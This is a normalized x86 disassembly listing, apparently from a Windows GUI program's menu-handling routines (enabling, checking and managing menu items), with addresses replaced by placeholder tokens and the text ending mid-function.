mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
jmp r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
test [ esi + 0x1c ] 0x2
jne r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_44d4d4
push eax
call EnableMenuItem
sub_44eee4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x3f ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov [ esi + 0x3f ] bl
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov edx esi
mov eax edi
call sub_44f2a4
mov edx eax
mov ecx ebx
mov eax edi
call sub_44d474
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov eax esi
call sub_44edd0
sub_44ef50
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_413f44
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_44c57c
sub_44efc0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_44ef40
test esi esi
jge r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax ebx
call sub_44efa8
cmp esi eax
je r-xdata
mov esi eax
dec esi
mov edi [ ebx + 0x64 ]
mov edx ebx
mov eax edi
call sub_44f2d8
mov ecx ebx
mov edx esi
mov eax edi
call sub_44f0cc
sub_44f008
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44ef40
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44ef50
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_44f060
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x3a ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ ebp + 0x3a ] bl
mov dl 0x1
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebp + 0x64 ] 0x0
je r-xdata
mov eax [ ebp + 0x64 ]
call sub_44ef40
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_44ef50
mov [ eax + 0x3a ] 0x0
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_44ef50
cmp [ eax + 0x3a ] 0x0
je r-xdata
sub_44f0cc
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
cmp [ esi + 0x64 ] 0x0
je r-xdata
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_44c57c
mov ebp edi
dec ebp
test ebp ebp
jl r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebx + 0x5c ] eax
mov cl [ esi + 0x3f ]
mov edx edi
mov eax ebx
call sub_44d474
mov ecx esi
mov edx edi
mov eax [ ebx + 0x5c ]
call sub_413fc0
mov [ esi + 0x64 ] ebx
mov [ esi + 0x84 ] ebx
mov [ esi + 0x80 ] sub_44f344
cmp [ ebx + 0x34 ] 0x0
je r-xdata
mov eax [ ebx + 0x5c ]
cmp ebp [ eax + 0x8 ]
jge r-xdata
mov eax ebx
call sub_44ef40
dec eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_44d3a4
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_413f44
mov al [ eax + 0x3f ]
cmp al [ esi + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_413f44
mov dl [ eax + 0x3f ]
mov eax esi
call sub_44eee4
sub_44f180
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_44c57c
cmp [ ebx + 0x5c ] 0x0
je r-xdata
mov eax ebx
call sub_44ef40
test eax eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_44d3a4
mov eax ebx
call sub_44ef40
cmp esi eax
jl r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_413f44
mov edi eax
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_413e34
xor eax eax
mov [ edi + 0x64 ] eax
xor eax eax
mov [ edi + 0x80 ] eax
mov [ edi + 0x84 ] eax
cmp [ ebx + 0x34 ] 0x0
je r-xdata
sub_44f1f4
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x39 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
jne r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
jne r-xdata
mov dl [ ebx + 0x38 ]
xor dl 0x1
mov eax ebx
call sub_44ee18
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_44ef28
test eax eax
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
je r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov eax ebx
call sub_44ef28
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x88 ]
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
mov edx ebx
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
jmp r-xdata
sub_44f2bc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44ef40
mov edx eax
mov ecx esi
mov eax ebx
call sub_44f0cc
pop esi
pop ebx
retn
sub_44f2d8
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_44f2a4
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov edx esi
mov eax ebx
call sub_44f180
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_44c57c
sub_44f300
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax esi
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
pop esi
pop ebx
retn
push ebx
mov ecx eax
mov edx esi
mov eax [ esi + 0x84 ]
call [ esi + 0x80 ]
xor eax eax
jmp r-xdata
cmp [ esi + 0x82 ] 0x0
je r-xdata
sub_44f344
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
push 0x0
mov ecx esi
mov edx ebx
call sub_44f344
jmp r-xdata
mov eax ebx
call sub_44d3a4
cmp [ ebx + 0x6c ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov eax esi
call sub_45101c
sub_44f39c
push ebx
mov ebx eax
cmp [ ebx + 0x4c ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ ebx + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov eax [ ebx + 0x4c ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_421eac
mov [ ebx + 0x4c ] eax
sub_44f3c4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov eax [ ebx + 0x44 ]
call sub_403258
xor eax eax
mov [ ebx + 0x44 ] eax
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x44 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_44f658
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_403454
mov edx ebx
mov eax edi
call sub_419afc
mov eax ebx
mov si 0xffee
call sub_403454
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x44 ] eax
pop edi
pop esi
pop ebx
retn
sub_44f434
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x4c ] 0x0
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_421eac
mov [ esi + 0x4c ] eax
sub_44f468
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_44ef40
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_44ef50
mov edx [ eax ]
call [ edx + 0x40 ]
inc esi
dec ebx
jne r-xdata
sub_44f4a8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_44f2d8
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov eax [ esi + 0x34 ]
mov edx ebx
call sub_44f2bc
jmp r-xdata
mov edx ebx
mov eax esi
call sub_44f2bc
sub_44f50c
push ebx
mov ebx eax
cmp dl [ ebx + 0x3d ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x3d ] dl
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebx + 0x3d ] 0x0
je r-xdata
mov eax ebx
call sub_44edd0
sub_44f538
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov eax edi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov al [ edi + 0x95 ]
mov [ esi + 0xa8 ] al
cmp [ esi + 0xa8 ] 0x0
jne r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_44eda8
cmp [ esi + 0x30 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x69 ]
mov eax esi
call sub_44ee18
cmp [ esi + 0x38 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
call sub_44ee6c
cmp [ esi + 0x39 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x74 ]
mov [ esi + 0x54 ] eax
cmp [ esi + 0x54 ] 0x0
jne r-xdata
test bl bl
je r-xdata
lea eax [ esi + 0x58 ]
mov edx [ edi + 0x7c ]
call sub_403ffc
cmp [ esi + 0x58 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov edx [ edi + 0x80 ]
mov eax esi
call sub_44ef98
cmp [ esi + 0x40 ] 0xffffffff
jne r-xdata
mov dl [ edi + 0x6c ]
mov eax esi
call sub_44eee4
cmp [ esi + 0x3f ] 0x0
jne r-xdata
mov dx [ edi + 0x84 ]
mov eax esi
call sub_44ef74
cmp [ esi + 0x60 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_44ef88
cmp [ esi + 0x3e ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x88 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x8c ] eax
cmp [ esi + 0x8a ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_44f658
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_44ef28
cmp edi eax
jne r-xdata
pop edi
pop esi
retn
xor ecx ecx
mov edx edi
mov eax esi
mov si 0xffef
call sub_403454
sub_44f67c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44f69c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44f6bc
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44f6dc
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44f6fc
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44f71c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44f73c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44f75c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44f77c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44f79c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4145e4
mov dl [ ebx + 0x39 ]
mov edi esi
mov eax edi
call sub_4495ec
mov edx [ ebx + 0x54 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x58 ]
mov eax edi
call sub_449724
mov edx [ ebx + 0x40 ]
mov eax edi
call sub_449784
mov edx [ ebx + 0x30 ]
mov eax edi
call sub_449484
mov dl [ ebx + 0x3e ]
mov eax edi
call sub_449844
push [ ebx + 0x8c ]
push [ ebx + 0x88 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44f814
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_419d48
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_44ef28
cmp edi eax
jne r-xdata
cmp edi [ esi + 0x7c ]
jne r-xdata
xor edx edx
mov eax esi
call sub_44f3c4
jmp r-xdata
cmp edi [ esi + 0x68 ]
jne r-xdata
xor edx edx
mov eax esi
call sub_44f868
jmp r-xdata
xor edx edx
mov eax esi
call sub_44d32c
sub_44f868
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x7c ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x7c ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x78 ]
call sub_44ad00
mov eax ebx
call sub_44f8d8
pop esi
pop ebx
retn
mov edx [ ebx + 0x78 ]
call sub_44ad44
mov edx ebx
mov eax [ ebx + 0x7c ]
call sub_419afc
sub_44f8b0
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_44f8b0
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_44ca00
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_44f344
mov eax ebx
pop esi
pop ebx
retn
sub_44f8ec
push ebp
mov ebp esp
push ebx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_40c414
test eax eax
setne bl
test bl bl
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
add edx 0xfffffffc
mov ecx 0x1
xchg edx eax
call sub_404508
sub_44f91c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_404040
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
pop ecx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_44f9a0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_44fac2
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax [ esi ]
call sub_404268
test eax eax
jle r-xdata
test bl bl
je r-xdata
mov edi 0x1
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov eax [ esi ]
call sub_404268
mov edx eax
sub edx 0x3
inc edx
mov eax [ esi ]
mov ecx 0x3
call sub_4044c8
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4043b4
jne r-xdata
inc edi
dec eax
jne r-xdata
mov bl 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44fac9
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403fcc
retn
mov edx esi
mov ecx [ ebp - 0x8 ]
mov eax r-xdata
call sub_404550
push [ esi ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
mov eax esi
mov edx 0x5
call sub_404328
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov eax [ esi ]
call sub_404268
mov ecx eax
sub ecx 0x3
mov eax [ esi ]
mov edx 0x1
call sub_4044c8
push [ ebp - 0x10 ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
push r-xdata
mov eax esi
mov edx 0x6
call sub_404328
jmp r-xdata
mov edx [ esi ]
mov dl [ edx + edi - 0x1 ]
mov ecx [ rw-data ]
and edx 0xff
bt [ ecx ] edx
jae r-xdata
sub_44fb00
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x40 ] ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x19 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_44ff9f
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1a ] 0x0
cmp [ ebp - 0x19 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_404040
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44ff60
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebp - 0x20 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_44ef40
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
lea eax [ ebp - 0x34 ]
mov edx [ ebp - 0x4 ]
call sub_404040
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ffa6
lea eax [ ebp - 0x48 ]
mov edx 0x4
call sub_403fcc
lea eax [ ebp - 0x34 ]
mov edx 0x3
call sub_403fcc
lea eax [ ebp - 0x18 ]
call sub_403fa8
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
mov eax ebx
call sub_450154
test al al
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
inc eax
mov [ ebp - 0x38 ] eax
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_44ef50
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_4043b4
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg [ ebp - 0x1a ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_44f91c
pop ecx
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebp - 0x10 ]
jle r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx 0x1
jmp r-xdata
mov edx esi
mov eax ebx
call sub_44ef50
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44ef50
cmp [ eax + 0x30 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403258
mov eax [ ebp - 0x20 ]
call sub_403258
mov eax [ ebp - 0x14 ]
call sub_403258
mov eax [ ebp - 0xc ]
call sub_403258
retn
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
push ebp
call sub_44f91c
pop ecx
mov eax [ ebp - 0x30 ]
call sub_404268
cmp ebx eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_44ef50
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x3c ]
call sub_4519f8
mov eax [ ebp - 0x3c ]
lea edx [ ebp - 0x2c ]
call sub_407c00
cmp [ ebp - 0x2c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
add eax 0x30
mov edx [ ebp - 0x30 ]
call sub_403ffc
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40c414
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x30 ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x2c ]
call sub_40c414
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_44ef50
push eax
mov edx esi
mov eax ebx
call sub_44ef50
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
jmp r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
dec [ ebp - 0x38 ]
jne r-xdata
inc edi
xor esi esi
lea eax [ ebp - 0x44 ]
push eax
mov ecx 0x1
mov edx ebx
mov eax [ ebp - 0x30 ]
call sub_4044c8
mov eax [ ebp - 0x44 ]
lea edx [ ebp - 0x2c ]
call sub_407c00
push ebp
mov eax [ ebp - 0x2c ]
call sub_44f8ec
pop ecx
test al al
je r-xdata
inc ebx
jmp r-xdata
push ebp
mov eax [ ebp - 0x2c ]
call sub_44f8ec
pop ecx
test al al
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40c414
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x34 ]
call sub_404040
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx eax
mov eax [ ebp - 0x20 ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ecx eax
dec ecx
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x70 ]
inc esi
dec edi
jne r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44ef50
add eax 0x30
push eax
mov edx esi
mov eax ebx
call sub_44ef50
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x40 ]
call sub_451964
mov edx [ ebp - 0x40 ]
pop eax
call sub_403ffc
mov edx esi
mov eax ebx
call sub_44ef50
push eax
mov edx esi
mov eax ebx
call sub_44ef50
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
lea eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x18 ]
call sub_404268
mov edx eax
mov ecx 0x1
mov eax [ ebp - 0x18 ]
call sub_4044c8
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x30 ]
xor ecx ecx
call sub_44f9a0
mov eax [ ebp - 0x18 ]
call sub_404268
mov edx eax
lea eax [ ebp - 0x18 ]
mov ecx 0x1
call sub_404508
lea edx [ ebp - 0x30 ]
mov ecx ebx
mov eax r-xdata
call sub_404550
lea eax [ ebp - 0x30 ]
mov ecx ebx
mov edx [ ebp - 0x2c ]
call sub_44f9a0
jmp r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
jmp r-xdata
sub_44fffc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
